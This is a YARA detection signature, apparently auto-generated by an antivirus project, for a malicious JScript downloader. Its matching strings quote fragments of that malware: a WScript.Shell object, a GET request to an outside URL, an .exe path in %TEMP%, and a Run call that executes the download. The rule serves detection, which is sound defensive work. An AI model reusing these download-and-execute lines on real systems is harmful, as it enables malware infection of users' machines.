rule sig_20160401_d5f6b57fe8548aeed97fc78bb4015c4d {
  meta:
    description = "datamaliciousorder - file 20160401_d5f6b57fe8548aeed97fc78bb4015c4d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7bddced552788ff2d76087572e0d5e28e675c3a4cccddba11b8e44e1a419bd7c"

  strings:
    $s1  = "var TeBzl = function ZtIky() {return WScript[SkaFx](\"WScript\"+\".Shell\");}(), CuWin = 11;" fullword ascii
    $s2  = "function ZeFqo(OvxIa, KmuAvs){OhqCx = OhqCx * 1; return OvxIa - KmuAvs;};" fullword ascii
    $s3  = "if (KhXoz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "KhXoz[WuVv](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s5  = "function NorQb() {return TeBzl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qC5cPajLY99210.ex\" + \"e\";};" fullword ascii
    $s6  = "function TpaCzu(){return BzfTbr + \"\";};" fullword ascii
    $s7  = "function HqJf() {return ((XaCb == true) && (XaCb == IwEjq)) ? 1 : OhqCx;};" fullword ascii
    $s8  = "var QmJrn = new this[\"Date\"]();" fullword ascii
    $s9  = "var SrFh = false;" fullword ascii
    $s10 = "function EbFp()" fullword ascii
    $s11 = "function LzqRed(){return SkaFx;};" fullword ascii
    $s12 = "var XaCb = false;" fullword ascii
    $s13 = "var IwEjq = false;" fullword ascii
    $s14 = "function RpqIy(YmTv) {var ObVbe = (1, 2, 3, 4, 5, YmTv); return ObVbe;};" fullword ascii
    $s15 = "}while (RdcRu);" fullword ascii
    $s16 = "return ZeFqo(LjcIcw, SyKun);" fullword ascii
    $s17 = "function TjiGbd(){return 23;};" fullword ascii
    $s18 = "XaCb = true; " fullword ascii
    $s19 = "function EgOn(JfOv){TeBzl[\"R\"+\"un\"](JfOv, OhqCx, OhqCx);};" fullword ascii
    $s20 = "IwEjq = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}